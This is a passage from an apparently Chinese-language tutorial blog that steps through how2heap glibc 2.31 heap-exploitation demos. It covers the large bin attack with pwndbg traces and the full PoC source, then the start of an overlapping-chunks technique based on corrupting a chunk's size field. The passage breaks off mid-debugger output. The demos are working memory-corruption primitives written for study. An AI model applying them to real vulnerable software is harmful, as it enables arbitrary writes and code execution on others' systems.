class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>然后我们再  malloc 一个比 p1 大的 chunk，此时 p1 会被放入到 lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> ► <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>然后我们在 free p2  ( p2 大小小于 p1 h和 p3) , 此时 p2 就会被放入到 unsortedbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> ► <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 p1 的 bk_nextsize 指向 target-0x20 , 此时的 p1 在 largebin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span> &lt;------ bk-&gt;nextsize</span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p &amp;target</span><br><span class="line">$<span class="number">14</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffe280</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx &amp;target<span class="number">-2</span></span><br><span class="line"><span class="number">0x7fffffffe260</span>:<span class="number">0x00007fffffffe2c0</span><span class="number">0x0000555555555140</span></span><br><span class="line"><span class="number">0x7fffffffe270</span>:<span class="number">0x00007fffffffe3b0</span><span class="number">0x00005555555554a4</span></span><br><span class="line"><span class="number">0x7fffffffe280</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555555592a0</span></span><br><span class="line"><span class="number">0x7fffffffe290</span>:<span class="number">0x00005555555596d0</span><span class="number">0x00005555555596f0</span></span><br><span class="line"><span class="number">0x7fffffffe2a0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559b30</span></span><br></pre></td></tr></table></figure><p>然后我们再 malloc 一个比 p2 大 chunk （此时 p2 在 unsortedbin 里），那么此时，就会将 p2 从 unsortedbin 取出，insert  largebins 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code>   —- &gt; <code> p1-&gt;fd_nextsize = p2-&gt;fd</code></p><p><code>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</code>   ——&gt; <code>p1-&gt;bk_nextsize = p2-&gt;fd-&gt;bk_next_size</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span class="number">0x00007ffff7fb0fd0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000555555559290</span><span class="number">0x00007fffffffe260</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x5555555596e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x5555555596f0</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559700</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559720</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x7ffff7fb0be0</span> &lt;main_arena+<span class="number">96</span>&gt;:<span class="number">0x0000555555559f60</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7fb0bf0</span> &lt;main_arena+<span class="number">112</span>&gt;:<span class="number">0x00005555555596e0</span><span class="number">0x00005555555596e0</span></span><br></pre></td></tr></table></figure><p>这样就成功在 target 目标写入 p2-&gt;fd-&gt;bk_next_size 的值，即 0x00005555555596e0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$<span class="number">22</span> = <span class="number">0x5555555596e0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>通常而言，这种写大数的行为，我们可以用来修改 <em>global_max_fast</em></p><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h3><p>通过修改 size 造成堆重叠，然后拿到两个指针指向同一个 chunk</p><p>构造如下 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x80</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559310</span>      <span class="number">0x3131313131313131</span>  <span class="number">0x500</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559810</span>      <span class="number">0x3232323232323232</span>  <span class="number">0x80</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>p1 是 大小 0x80 的chunk， p2 是大小为 0x500 的chunk ，p3 是大小为 0x80 的chuk</p><p>然后修改 p2 的大小 为 p2 +p 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">44</span> <span class="comment">/* VULNERABILITY */</span></span><br><span class="line">► <span class="number">45</span> *(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">  <span class="number">46</span> <span class="comment">/* VULNERABILITY */</span></span><br></pre></td></tr></table></figure><p>再然后释放 p2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">48</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">► <span class="number">49</span> <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="number">50</span> <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>再分配一个新的 大小符合修改之后的  chunk， 可以把 修改完 chunk 之后的 p2+p3 重新分配回来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">56</span> p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"> ► <span class="number">58</span> <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">   <span class="number">59</span> <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">   <span class="number">60</span> <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line">   <span class="number">61</span></span><br><span class="line">   <span class="number">62</span> <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">   <span class="number">63</span>    <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffe280 —▸ 0x7fffffffe3b8 —▸ 0x7fffffffe633 ◂— &#x27;/media/psf/Home/Downloads/how2heap/glibc_2.31/overlapping_chunks&#x27;</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> ◂— <span class="number">0x15555556d</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x7ffff7fb5fc8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> ◂— <span class="number">0x57800000581</span></span><br><span class="line">04:0020│      0x7fffffffe2a0 —▸ 0x5555555592a0 ◂— 0x3131313131313131 (&#x27;11111111&#x27;)</span><br><span class="line">05:0028│      0x7fffffffe2a8 —▸ 0x555555559320 ◂— 0x3232323232323232 